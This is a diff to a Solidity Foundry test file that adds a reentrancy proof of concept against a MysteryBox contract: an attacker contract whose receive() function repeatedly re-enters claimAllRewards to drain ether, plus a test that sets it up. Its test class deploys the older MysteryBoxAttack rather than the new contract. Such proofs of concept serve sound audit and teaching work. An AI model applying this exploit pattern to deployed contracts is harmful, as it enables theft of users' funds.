@@ -260,7 +260,6 @@ contract MysteryBoxAttack is Test {
     function Attack() public {
     
         console.log("Attack contract balance", address(this).balance);
-        //mysteryBox.claimAllRewards(); // exploit here
         mysteryBox.claimSingleReward(0);
         console.log("Attack contract balance", address(this).balance);
         console.log("MysteryBox balance", address(mysteryBox).balance);
@@ -279,21 +278,19 @@ contract MysteryBoxAttack is Test {
     }
 }
 
+
 contract ContractTest is Test {
     MysteryBox mysteryBox;
-    //EtherStoreRemediated storeRemediated;
     MysteryBoxAttack attack;
-    MysteryBoxAttack attackRemediated;
 
     address user1 = address(0x1);
     address user3 = address(0x2f);
     address user4 = address(0x4);
 
     function setUp() public {
-        mysteryBox = new MysteryBox(); //MysteryBox(_mysteryBox);
-        //storeRemediated = new EtherStoreRemediated();
+        mysteryBox = new MysteryBox(); 
+       
         attack = new MysteryBoxAttack(address(mysteryBox));
-        //attackRemediated = new EtherStoreAttack(address(storeRemediated));
         vm.deal(user1, 1 ether);
         vm.startPrank(user1);
         mysteryBox.buyBox{value: 0.1 ether}();
@@ -330,7 +327,83 @@ contract ContractTest is Test {
         attack.Attack();
     }
 
-    function testFailRemediated() public {
-        attackRemediated.Attack();
+}
+
+contract MysteryBoxClaimAllAttack is Test {
+    MysteryBox mysteryBox;
+    address user3 = address(0x2f);
+
+    constructor(address _mysteryBox) {
+        mysteryBox = MysteryBox(_mysteryBox);
     }
+
+    function Attack() public {
+    
+        console.log("Attack contract balance", address(this).balance);
+        mysteryBox.claimAllRewards();
+        console.log("Attack contract balance", address(this).balance);
+        console.log("MysteryBox balance", address(mysteryBox).balance);
+        
+    }
+
+    // fallback() external payable {}
+
+    // we want to use fallback function to exploit reentrancy
+    receive() external payable {
+        console.log("Attack contract balance ", address(this).balance);
+        console.log("MysteryBox balance", address(mysteryBox).balance);
+        if (address(mysteryBox).balance >= 0.1 ether) {
+            mysteryBox.claimAllRewards(); // exploit here
+        }
+    }
+}
+
+contract ContractClaimAllTest is Test {
+    MysteryBox mysteryBox;
+    MysteryBoxAttack attack;
+
+    address user1 = address(0x1);
+    address user3 = address(0x2f);
+    address user4 = address(0x4);
+
+    function setUp() public {
+        mysteryBox = new MysteryBox(); 
+       
+        attack = new MysteryBoxAttack(address(mysteryBox));
+        vm.deal(user1, 1 ether);
+        vm.startPrank(user1);
+        mysteryBox.buyBox{value: 0.1 ether}();
+        vm.stopPrank();
+
+        vm.deal(user4, 1 ether);
+        vm.startPrank(user4);
+        mysteryBox.buyBox{value: 0.1 ether}();
+        vm.stopPrank();
+
+        vm.deal(user3, 1 ether);
+        vm.startPrank(user3);
+        mysteryBox.buyBox{value: 0.1 ether}();
+        console.log("User Buy box");
+        console.log(
+            "After buy box, MysteryBox balance",
+            address(mysteryBox).balance
+        );
+
+        mysteryBox.openBox();
+        console.log("User Open box");
+        assertEq(mysteryBox.boxesOwned(user3), 0);
+
+        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
+        console.log("User rewards name:",rewards[0].name);
+        console.log("User rewards value:",rewards[0].value);
+        
+        mysteryBox.transferReward(address(attack),0);
+        console.log("User reward transfer to attack contract");
+        vm.stopPrank();
+    }
+
+    function testClaimAllReentrancy() public {
+        attack.Attack();
+    }
+
 }
